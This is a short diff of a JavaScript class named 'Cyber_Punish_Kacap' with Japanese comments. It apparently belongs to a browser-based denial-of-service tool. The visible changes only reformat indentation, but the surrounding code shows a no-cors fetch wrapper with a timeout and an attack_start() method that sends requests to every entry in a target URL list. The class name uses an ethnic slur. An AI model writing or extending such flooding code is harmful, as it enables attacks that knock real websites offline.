@@ -33,12 +33,12 @@ class Cyber_Punish_Kacap {
         mode: 'no-cors',            // CORS-safelisted methodsとCORS-safelisted request-headersだけを使ったリクエストを送る。
         signal: controller.signal   // オブジェクトのインスタンスを返
       }).then((response) => {       // 成功した場合
-        clearTimeout(id);			  // タイムアウトを消す。
-        return response;			  // 応答結果を返す。
-      }).catch((error) => {		  // 失敗した場合
+        clearTimeout(id);			      // タイムアウトを消す。
+        return response;			      // 応答結果を返す。
+      }).catch((error) => {		      // 失敗した場合
         console.log(error.code);    // エラーコードを出力
-        clearTimeout(id);			  // タイムアウトを消す。
-        throw error;				  // エラーを投げる。
+        clearTimeout(id);			      // タイムアウトを消す。
+        throw error;				        // エラーを投げる。
       });
     }
 
@@ -99,8 +99,8 @@ class Cyber_Punish_Kacap {
     }       
     // 実行関数
     attack_start(){
-     // 全てのターゲット要素に対してデータ送信処理を実行する。
-     Object.keys(this.target_urls).map(this.punish_target);
+      // 全てのターゲット要素に対してデータ送信処理を実行する。
+      Object.keys(this.target_urls).map(this.punish_target);
     }
 }
   
